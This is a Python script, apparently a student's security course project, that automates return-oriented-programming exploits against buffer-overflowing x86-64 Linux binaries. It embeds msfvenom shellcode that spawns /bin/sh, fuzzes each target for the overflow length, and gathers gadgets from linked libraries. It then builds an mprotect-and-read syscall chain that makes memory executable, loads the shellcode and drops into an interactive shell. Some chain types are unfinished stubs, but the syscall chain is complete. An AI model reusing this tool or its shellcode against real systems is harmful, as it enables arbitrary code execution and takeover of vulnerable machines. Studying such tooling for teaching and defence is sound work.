#!/usr/bin/env python3
#
# ROPe.py
# Return Oriented Programming executor.
#
# Developed on Kali Linux 2020.1 x86-64
#
# Daniel Calabria
# 103406017
# CSE 363 Project

import os
import argparse
import struct
import subprocess
import re
from capstone import *
from pwn import *

arch = CS_ARCH_X86      # x86 processors
mode = CS_MODE_64       # 64-bit by default

verbose = False         # Enable verbose output?
files = None            # List of files to examine

# gen'd by msfvenom for linux/x64/exec CMD='/bin/sh', avoid \x00 
EXEC_BINSH64_SC =  b""
EXEC_BINSH64_SC += b"\x48\x31\xc9\x48\x81\xe9\xfa\xff\xff\xff\x48\x8d\x05"
EXEC_BINSH64_SC += b"\xef\xff\xff\xff\x48\xbb\x71\x08\x60\xd2\x83\x85\xee"
EXEC_BINSH64_SC += b"\xcb\x48\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4"
EXEC_BINSH64_SC += b"\x1b\x33\x38\x4b\xcb\x3e\xc1\xa9\x18\x66\x4f\xa1\xeb"
EXEC_BINSH64_SC += b"\x85\xbd\x83\xf8\xef\x08\xff\xe0\x85\xee\x83\xf8\xee"
EXEC_BINSH64_SC += b"\x32\x3a\x8b\x85\xee\xcb\x5e\x6a\x09\xbc\xac\xf6\x86"
EXEC_BINSH64_SC += b"\xcb\x27\x5f\x28\x5b\x65\x8a\xeb\xcb"

# Shellcode to be executed
shellcode = EXEC_BINSH64_SC

PLACEHOLDER = 0xdeadc0de
gadget_map = {}
has_libc = True
libc_addr = None
buflen = 0
mprotect_addr = None
mmap_addr = None
memcpy_addr = None
sc_addr = None
global_null_byte = None

# pretty colors
class Colors:
    BLACK = "\033[0;30m"
    RED = "\033[0;31m"
    GREEN = "\033[0;32m"
    YELLOW = "\033[0;33m"
    CYAN = "\033[0;36m"
    GREY = "\033[0;37m"
    WHITE = "\033[1;37m"
    BOLD = "\033[1m"
    UNDERLINE = "\033[4m"
    RESET = "\033[0m"


# Prints out `s` if verbosity/debugging is enabled 
def debug(s, **kwargs):
    if verbose is True:
        if kwargs:
            print(f"{Colors.RED}{Colors.BOLD}DEBUG{Colors.WHITE}: {Colors.RESET}{s} {kwargs}{Colors.GREY}")
        else:
            print(f"{Colors.RED}{Colors.BOLD}DEBUG{Colors.WHITE}: {Colors.RESET}{s}{Colors.GREY}")


# Determines the length of the buffer necessary to cause SEGV
def find_buffer_length(f):
    buf = "A"
    found = False

    while found is False:
        # cap our buffer size at 5k
        if len(buf) > 5000:
            break

        proc = subprocess.Popen([f, buf], stdout=PIPE, stderr=PIPE)
        try:
            stdout, stderr = proc.communicate(timeout=5)
        except TimeoutExpired:
            proc.kill()
            stdout, stderr = proc.communicate()

        if proc.returncode == -11:
            debug(f"found overflow length: {len(buf)}")
            found = True
            break
        buf += "A"

    if found is False:
        return -1
    return len(buf)


# Tries to determine a suitable memory page to make RWX
# This should be in the address space of the binary we're trying to exploit,
# in some currently non-executable region
def find_sc_addr(f):
    elf = ELF(f)


    pass

# Small helper function to print a gadget in human-readable format
def print_gadget(g, g_addr):
    if verbose == 0:
        return

    md = Cs(CS_ARCH_X86, CS_MODE_64)
    md.detail = False

    instr_list = md.disasm(g, g_addr)
    s = f"{Colors.BOLD}{Colors.WHITE}" + format(g_addr, '#010x') + f"{Colors.GREY}: "
    for i in instr_list:
        s += i.mnemonic
        if i.op_str != "":
            s += f" {i.op_str}"
        s += f"{Colors.YELLOW};{Colors.GREY} "
    s += f"{Colors.RESET}{Colors.GREY}"
    print(s)


# Looks for usable gadgets in elfname, which is loaded into our target binary at baseaddr
def build_gadgets(elfname, baseaddr):
    global gadget_map
    gadgets = {}

    # we're only concerned with executable segments
    elf = ELF(elfname)
    for seg in elf.executable_segments:
        debug(f"Executable segment @ {hex(baseaddr + seg.header.p_paddr)} (offset {hex(seg.header.p_paddr)})")

        # read the segment
        data = elf.read(seg.header.p_paddr, seg.header.p_filesz)
        
        # does section contain ret instrs?
        ret_count = data.count(b"\xc3")
        if ret_count == 0:
            continue

        # split around ret instrs, clamp them to be <= 25 bytes long, and incrementally add unique ones into the gadgets list
        s_data = data.split(b"\xc3")
        s_offset = 0x0
        for s in s_data:
            # splitting around c3 bytes actually removes them, so we need to add them back in
            s += b"\xc3"

            s_len = len(s)
            i = 0
            if s_len > 25:
                s_len = 25

            while i < s_len:
                gadgets[baseaddr + s_offset + i] = s[i:s_len]
                i += 1

            s_offset += len(s)
            
        # check if the gadgets found are unique, and add them to the global map if so
        for g_addr in gadgets:
            if gadgets[g_addr] not in gadget_map.values():
                md = Cs(CS_ARCH_X86, CS_MODE_64)
                md.detail = False
                g = gadgets[g_addr]
                instr_list = md.disasm(g, g_addr)

                if instr_list is None:
                    continue

                g_len = len(g)
                cur_len = 0
                keep_gadget = True
                has_ret = False
                has_syscall = False

                for i in instr_list:
                    cur_len += i.size
                    # we only want things that end in ret
                    if i.mnemonic == "ret" and i.op_str == "":
                        has_ret = True

                    # get rid of all leave/j/call type instructions
                    if i.mnemonic == "leave":
                        keep_gadget = False
                        break
                    if i.mnemonic[0] == 'j':
                        keep_gadget = False
                        break
                    if i.mnemonic == "call":
                        keep_gadget = False
                        break

                if keep_gadget and cur_len == g_len and has_ret:
                    gadget_map[g_addr] = g
                    print_gadget(g, g_addr)


# Attempts to build the libc-mprotect chain
def build_libc_mprotect(f):

    return None

#################### GADGET LOCATORS ######################

# Looks for `syscall; ret;` gadget, returning an address if found, or None if not found
def find_syscall_ret():
    global gadget_map
    for g_addr in gadget_map:
        md = Cs(CS_ARCH_X86, CS_MODE_64)
        md.detail = False
        g = gadget_map[g_addr]
        instr_list = list(md.disasm(g, g_addr))

        if len(instr_list) == 2:
            if instr_list[0].mnemonic == "syscall" and instr_list[1].mnemonic == "ret":
                debug(f"found suitable {Colors.BOLD}{Colors.CYAN}syscall; ret;{Colors.GREY} gadget @ {Colors.YELLOW}{hex(g_addr)}{Colors.GREY}{Colors.RESET}")
                return g_addr
    debug(f"no suitable {Colors.BOLD}{Colors.CYAN}syscall; ret;{Colors.GREY} gadget found!{Colors.RESET}")
    return None


# Looks for `pop rax; ret;` gadget, returning an address if found, or None if not found
def find_pop_rax_ret():
    global gadget_map
    for g_addr in gadget_map:
        md = Cs(CS_ARCH_X86, CS_MODE_64)
        md.detail = False
        g = gadget_map[g_addr]
        instr_list = list(md.disasm(g, g_addr))

        if len(instr_list) == 2:
            if instr_list[0].mnemonic == "pop" and instr_list[0].op_str == "rax" and instr_list[1].mnemonic == "ret":
                debug(f"found suitable {Colors.BOLD}{Colors.CYAN}pop rax; ret;{Colors.GREY} gadget @ {Colors.YELLOW}{hex(g_addr)}{Colors.GREY}{Colors.RESET}")
                return g_addr
    debug(f"no suitable {Colors.BOLD}{Colors.CYAN}pop rax; ret;{Colors.GREY} gadget found!{Colors.RESET}")
    return None


# Looks for `pop rdi; ret;` gadget, returning an address if found, or None if not found
def find_pop_rdi_ret():
    global gadget_map
    for g_addr in gadget_map:
        md = Cs(CS_ARCH_X86, CS_MODE_64)
        md.detail = False
        g = gadget_map[g_addr]
        instr_list = list(md.disasm(g, g_addr))

        if len(instr_list) == 2:
            if instr_list[0].mnemonic == "pop" and instr_list[0].op_str == "rdi" and instr_list[1].mnemonic == "ret":
                debug(f"found suitable {Colors.BOLD}{Colors.CYAN}pop rdi; ret;{Colors.GREY} gadget @ {Colors.YELLOW}{hex(g_addr)}{Colors.GREY}{Colors.RESET}")
                return g_addr
    debug(f"no suitable {Colors.BOLD}{Colors.CYAN}pop rdi; ret;{Colors.GREY} gadget found!{Colors.RESET}")
    return None

# Looks for `pop rsi; ret;` gadget, returning an address if found, or None if not found
def find_pop_rsi_ret():
    global gadget_map
    for g_addr in gadget_map:
        md = Cs(CS_ARCH_X86, CS_MODE_64)
        md.detail = False
        g = gadget_map[g_addr]
        instr_list = list(md.disasm(g, g_addr))

        if len(instr_list) == 2:
            if instr_list[0].mnemonic == "pop" and instr_list[0].op_str == "rsi" and instr_list[1].mnemonic == "ret":
                debug(f"found suitable {Colors.BOLD}{Colors.CYAN}pop rsi; ret;{Colors.GREY} gadget @ {Colors.YELLOW}{hex(g_addr)}{Colors.GREY}{Colors.RESET}")
                return g_addr
    debug(f"no suitable {Colors.BOLD}{Colors.CYAN}pop rsi; ret;{Colors.GREY} gadget found!{Colors.RESET}")
    return None


# Looks for `pop rdx; ret;` gadget, returning an address if found, or None if not found
def find_pop_rdx_ret():
    global gadget_map
    for g_addr in gadget_map:
        md = Cs(CS_ARCH_X86, CS_MODE_64)
        md.detail = False
        g = gadget_map[g_addr]
        instr_list = list(md.disasm(g, g_addr))

        if len(instr_list) == 2:
            if instr_list[0].mnemonic == "pop" and instr_list[0].op_str == "rdx" and instr_list[1].mnemonic == "ret":
                debug(f"found suitable {Colors.BOLD}{Colors.CYAN}pop rdx; ret;{Colors.GREY} gadget @ {Colors.YELLOW}{hex(g_addr)}{Colors.GREY}{Colors.RESET}")
                return g_addr
    debug(f"no suitable {Colors.BOLD}{Colors.CYAN}pop rdx; ret;{Colors.GREY} gadget found!{Colors.RESET}")
    return None


# pop r12; pop r13; ret;
def find_pop_r12_pr():
    global gadget_map
    for g_addr in gadget_map:
        md = Cs(CS_ARCH_X86, CS_MODE_64)
        md.detail = False
        g = gadget_map[g_addr]
        instr_list = list(md.disasm(g, g_addr))

        if len(instr_list) == 3:
            if instr_list[0].mnemonic == "pop" and instr_list[0].op_str == "r12" and instr_list[1].mnemonic == "pop" and instr_list[1].op_str == "r13" and instr_list[2].mnemonic == "ret":
                debug(f"found suitable {Colors.BOLD}{Colors.CYAN}pop r12; pop r13; ret;{Colors.GREY} gadget @ {Colors.YELLOW}{hex(g_addr)}{Colors.GREY}{Colors.RESET}")
                return g_addr
    debug(f"no suitable {Colors.BOLD}{Colors.CYAN}pop r12; pop r13; ret;{Colors.GREY} gadget found!{Colors.RESET}")
    return None


# mov rdx, r12; pop r12; pop r13; ret
def find_mov_rdx_r12_ppr():
    global gadget_map
    for g_addr in gadget_map:
        md = Cs(CS_ARCH_X86, CS_MODE_64)
        md.detail = False
        g = gadget_map[g_addr]
        instr_list = list(md.disasm(g, g_addr))

        if len(instr_list) == 4:
            if instr_list[0].mnemonic == "mov" and instr_list[0].op_str == "rdx, r12" and instr_list[1].mnemonic == "pop" and instr_list[1].op_str == "r12" and instr_list[2].mnemonic == "pop" and instr_list[2].op_str == "r13" and instr_list[3].mnemonic == "ret":
                debug(f"found suitable {Colors.BOLD}{Colors.CYAN}mov rdx, r12; pop r12; pop r13; ret;{Colors.GREY} gadget @ {Colors.YELLOW}{hex(g_addr)}{Colors.GREY}{Colors.RESET}")
                return g_addr
    debug(f"no suitable {Colors.BOLD}{Colors.CYAN}mov rdx, r12; pop r12; pop r13; ret;{Colors.GREY} gadget found!{Colors.RESET}")
    return None

# Looks for `xor rax, rax; ret;` gadget, returning an address if found, or None if not found
def find_xor_rax_rax_ret():
    global gadget_map
    for g_addr in gadget_map:
        md = Cs(CS_ARCH_X86, CS_MODE_64)
        md.detail = False
        g = gadget_map[g_addr]
        instr_list = list(md.disasm(g, g_addr))

        if len(instr_list) == 2:
            if instr_list[0].mnemonic == "xor" and instr_list[0].op_str == "rax, rax" and instr_list[1].mnemonic == "ret":
                debug(f"found suitable {Colors.BOLD}{Colors.CYAN}xor rax, rax; ret;{Colors.GREY} gadget @ {Colors.YELLOW}{hex(g_addr)}{Colors.GREY}{Colors.RESET}")
                return g_addr
    debug(f"no suitable {Colors.BOLD}{Colors.CYAN}xor rax, rax; ret;{Colors.GREY} gadget found!{Colors.RESET}")
    return None


# Looks for `add rax, 1; ret;` gadget, returning an address if found, or None if not found
def find_add_rax_1_ret():
    global gadget_map
    for g_addr in gadget_map:
        md = Cs(CS_ARCH_X86, CS_MODE_64)
        md.detail = False
        g = gadget_map[g_addr]
        instr_list = list(md.disasm(g, g_addr))

        if len(instr_list) == 2:
            if instr_list[0].mnemonic == "add" and instr_list[0].op_str == "rax, 1" and instr_list[1].mnemonic == "ret":
                debug(f"found suitable {Colors.BOLD}{Colors.CYAN}add rax, 1; ret;{Colors.GREY} gadget @ {Colors.YELLOW}{hex(g_addr)}{Colors.GREY}{Colors.RESET}")
                return g_addr
    debug(f"no suitable {Colors.BOLD}{Colors.CYAN}add  rax, 1; ret;{Colors.GREY} gadget found!{Colors.RESET}")
    return None


# Attempts to build the syscall-mprotect chain
def build_syscall_mprotect(f):
    # our goal here is to `mprotect(ADDR, LEN, R|W|X)` via system call
    global buflen
    global sc_addr

    syscall = find_syscall_ret() # addr of syscall gadget
    pop_rax = find_pop_rax_ret() # syscall number, should be 0xa (10) for mprotect
    pop_rdi = find_pop_rdi_ret() # 1st arg
    pop_rsi = find_pop_rsi_ret() # 2nd arg
    
    # 3rd arg, need to get 0x7 into rdx by using r12
    pop_r12_pr = find_pop_r12_pr() # r12 = 7
    mov_rdx_r12_ppr = find_mov_rdx_r12_ppr() # rdx = r12

    xor_rax_rax = find_xor_rax_rax_ret() # rax = 0
    add_rax_1 = find_add_rax_1_ret()     # used to increment rax to the correct syscall number

    if syscall is None or pop_rax is None or pop_rdi is None or pop_rsi is None or pop_r12_pr is None or mov_rdx_r12_ppr is None or xor_rax_rax is None or add_rax_1 is None:
        print(f"{Colors.BOLD}{Colors.RED}Insufficient gadgets found for this chain!{Colors.GREY}{Colors.RESET}")
        return None

    payload = ""
    payload = b'A' * buflen                 # padding

    # first the mprotect call to set up the area
    payload += p64(xor_rax_rax)        # rax = 0
    payload += p64(add_rax_1) * 10     # rax = 10
    payload += p64(pop_rdi)            # 1st arg
    payload += p64(sc_addr)            # address we want to make r/w/x
    payload += p64(pop_rsi)            # 2nd arg
    payload += p64(0x1000)             # 4kb (pagesize)
    payload += p64(pop_r12_pr)         # r12 = 7
    payload += p64(0x7)                # 7
    payload += p64(PLACEHOLDER)        # needed because pop_r12_pr has an extra pop in it
    payload += p64(mov_rdx_r12_ppr)    # rdx = r12 = 7
    payload += p64(PLACEHOLDER) * 2    # needed because mov_rdx_r12_ppr has 2 extra pops in it
    payload += p64(syscall)            # syscall

    # second, we use a read() call to read the shellcode into the buffer
    payload += p64(xor_rax_rax)        # rax = 0
    payload += p64(pop_rdi)            # 1st arg
    payload += p64(0x0)                # FD0 (standard input)
    payload += p64(pop_rsi)            # 2nd arg
    payload += p64(sc_addr)            # address to write into
    payload += p64(pop_r12_pr)         # r12 = 0x1000
    payload += p64(0x1000)             # 0x1000
    payload += p64(PLACEHOLDER)        # needed for the extra pr in pop_r12_pr
    payload += p64(mov_rdx_r12_ppr)    # rdx = r12 = 0x1000
    payload += p64(PLACEHOLDER) * 2    # needed for the extra ppr in mov_rdx_r12_ppr
    payload += p64(syscall)            # syscall

    payload += p64(sc_addr)            # return into the read shellcode

    return payload


# Attempts to build one of the chains for the specified file
def build_chain(filename):
    global gadget_map
    global has_libc
    global libc_addr
    global buflen
    global mprotect_addr
    global mmap_addr
    global memcpy_addr
    global sc_addr
    global global_null_byte

    # reset to defaults, in case this is for a non-first binary
    gadget_map = {}
    has_libc = True
    libc_addr = None
    buflen = 0
    mprotect_addr = None
    mmap_addr = None
    memcpy_addr = None
    sc_addr = None
    global_null_byte = None

    print(f"{Colors.BOLD}{Colors.WHITE}Attempting to build ROP chain for \'{Colors.YELLOW}{filename}{Colors.WHITE}\'{Colors.RESET}{Colors.GREY}")

    elf = ELF(filename)


    # What libraries is this linked against?
    # Herein we look for libc so we can update the libc base address (req'd for the libc calls above)
    # and also build the gadget list for each library
    for libname in elf.libs:
        debug(f"ELF linked against {libname} : {hex(elf.libs[libname])}")

        if sc_addr is None:
            for s in elf.segments:
                if s.header.p_type == 'PT_LOAD' and s.header.p_flags == 6:
                    # ok, this should be a good spot.. needs to be page aligned, though
                    h = s.header
                    addr = h.p_vaddr
                    if addr % 4096 != 0:
                        addr += 4096
                        addr = addr // 4096
                        addr *= 4096
                    sc_addr = elf.libs[libname] + addr
                    debug(f"targetting address for mprotect {hex(sc_addr)}")

        # Find a NULL byte, in case we need to use it later, since we won't be able to put NULLs in the payload
        # we'll need to copy one from somewhere else
        if global_null_byte is None:
            le = ELF(libname)
            has_null = list(le.search(b'\x00'))
            if has_null is not None:
                debug(f"NULL found @ {has_null[-1]}")
                global_null_byte = elf.libs[libname] + has_null[-1]

        # is it libc? update the libc base addr
        is_libc = re.search('/libc-*.*.so$', libname)
        if is_libc is not None:
            libc_addr = elf.libs[libname]
            debug(f"libc base address @ {hex(libc_addr)}")

        # Build the collection of gadgets
        build_gadgets(libname, elf.libs[libname])

    print(f"{Colors.BOLD}{Colors.YELLOW}{len(gadget_map)}{Colors.GREY} gadgets found.{Colors.RESET}")

    # Determine length of buffer which causes vulnerability
    buflen = find_buffer_length(filename)

    if buflen <= 0:
        print(f"{Colors.BOLD}{Colors.YELLOW}{filename}{Colors.WHITE} does not appear to be vulnerable.")
        return None
    print(f"Target buffer overflows at {Colors.BOLD}{Colors.GREEN}{buflen}{Colors.RESET}{Colors.GREY} bytes")

    # get the addresses of the functions needed in libc
    if elf.libc is None:
        debug("ELF does not import libc.")
        has_libc = False

    if has_libc is True:
        libc = elf.libc
        mprotect_addr = libc_addr + libc.symbols['mprotect']
        mmap_addr = libc_addr + libc.symbols['mmap']
        memcpy_addr = libc_addr + libc.symbols['memcpy']
        debug(f"libc mprotect addr @ {hex(mprotect_addr)}")
        debug(f"libc mmap addr @ {hex(mmap_addr)}")
        debug(f"libc memcpy addr @ {hex(memcpy_addr)}")

    # Try libc-mprotect chain
    print(f"{Colors.BOLD}{Colors.GREY}Attempting {Colors.YELLOW}libc-mprotect{Colors.GREY} chain...")
    res = build_libc_mprotect(filename)
    
    if res is not None:
        print("chain 1 made!")
        return

    # Try syscall-mprotect chain
    print(f"{Colors.BOLD}{Colors.GREY}Attempting {Colors.YELLOW}syscall-mprotect{Colors.GREY} chain...")
    res = build_syscall_mprotect(filename)
    if res is not None:
        print(f"{Colors.BOLD}{Colors.WHITE}Successfully constructed syscall-mprotect chain...{Colors.GREY}{Colors.RESET}")
        print(f"{Colors.BOLD}{Colors.WHITE}*** Executing {Colors.GREEN}{filename}{Colors.GREY}{Colors.RESET}")
        print_payload(res)
        print(f"unfiltered: {res}")
        #subprocess.call([filename, res])
        p = process("gdb", "--args", filename, res)
        p.sendline(EXEC_BINSH64_SC)
        p.interactive()

        return

    # Try libc-mmap-memcpy chain
    print(f"{Colors.BOLD}{Colors.GREY}Attempting {Colors.YELLOW}libc-mmap-memcpy{Colors.GREY} chain...")
    
    # Try syscall-mmap-memcpy chain
    print(f"{Colors.BOLD}{Colors.GREY}Attempting {Colors.YELLOW}syscall-mmap-memcpy{Colors.GREY} chain...")


# Prints out the generated payload in a human-readable format (hex-encoded string)
def print_payload(s):
    i = 0
    for c in s:
        print(f"\\x{hex(c)}", end='')
        i += 4
        if i == 80:
            print()
            i = 0
    print()


    outf = open("rop-chain.out", "w")
    for c in s:
        outf.write(f"\\x{hex(c)}")
    outf.close()


# Main ROPe function
def ROPe():

    # parse arguments
    parser = argparse.ArgumentParser(description="Automatically generate a ROP chain suitable for executing a third party payload.")
    parser.add_argument('-v', action='store_true', help='enable verbose output')
    parser.add_argument('files', nargs='+', help='list of ELFs to examine (must be in $PATH, or absolute paths)')
    args = parser.parse_args()

    if args.v:
        global verbose
        verbose = True
        debug("verbose: True")

    if args.files:
        global files
        debug(f"Files: {args.files}")
        files = args.files

    context(os='linux', arch='amd64')

    print(f"{Colors.BOLD}{Colors.GREY}Supplied shellcode{Colors.WHITE}: {Colors.GREY}\"{Colors.YELLOW}{shellcode}{Colors.GREY}\" {Colors.WHITE}")
   
    # Go through each supplied file, trying to build a ROP chain using it's gadgets
    for f in files:
        try:
            build_chain(f)
        except FileNotFoundError:
            print(f"{Colors.BOLD}{Colors.YELLOW}{f}{Colors.GREY} not found.{Colors.RESET}")


if __name__ == "__main__":
    ROPe()
